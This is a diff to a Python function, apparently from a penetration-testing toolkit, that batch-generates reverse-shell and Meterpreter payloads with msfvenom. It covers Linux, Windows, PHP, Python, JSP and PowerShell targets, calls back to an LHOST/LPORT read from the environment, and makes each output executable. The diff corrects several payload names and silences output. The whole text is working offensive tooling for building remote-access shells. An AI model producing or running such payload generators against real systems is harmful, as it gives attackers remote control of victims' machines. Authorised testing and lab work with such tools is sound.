@@ -79,22 +79,22 @@ def GenerateShells():
 		"RawShellX64.elf": "linux/x64/shell_reverse_tcp",
 		"RawShellX64.exe": "windows/x64/shell_reverse_tcp",
 		"RawShellX86.elf": "linux/x86/shell_reverse_tcp",
-		"RawShellX86.exe": "windows/x86/shell_reverse_tcp",
+		"RawShellX86.exe": "windows/shell_reverse_tcp",
 		"RawShell.sh": "cmd/unix/reverse_bash",
 		"RawShellX64.ps1": "windows/x64/powershell_reverse_tcp",
 		"RawShell.jsp": "java/shell_reverse_tcp",
 		"Meterpreter.php": "php/meterpreter/reverse_tcp",
 		"Meterpreter.py": "python/meterpreter/reverse_tcp",
-		"Meterpreterx86.exe": "windows/x86/meterpreter/reverse_tcp",
+		"MeterpreterX64.exe": "windows/x64/meterpreter/reverse_tcp",
 		"MeterpreterX86.elf": "linux/x86/meterpreter/reverse_tcp",
 		"MeterpreterX64.elf": "linux/x64/meterpreter/reverse_tcp",
-		"MeterpreterX64.exe": "windows/x64/meterpreter/reverse_tcp"
+		"Meterpreterx86.exe": "windows/meterpreter/reverse_tcp"
 	}
 
 	for FileName , Payload in tqdm(Payloads.items()):
 		try:
 			subprocess.run(["sudo", "msfvenom", "-p", Payload, f"LHOST={os.getenv('LHOST')}", f"LPORT={os.getenv('LPORT')}", "-f", "raw", "-o", f"{HomePath}/shells/{FileName}"], stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL )
-			subprocess.run(["sudo", "chmod" , "u+x", f"{HomePath}/shells/{FileName}"])
+			subprocess.run(["sudo", "chmod" , "u+x", f"{HomePath}/shells/{FileName}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 		except Exception as e:
 			print(f"Something went wrong: {e}")
 			sys.exit()
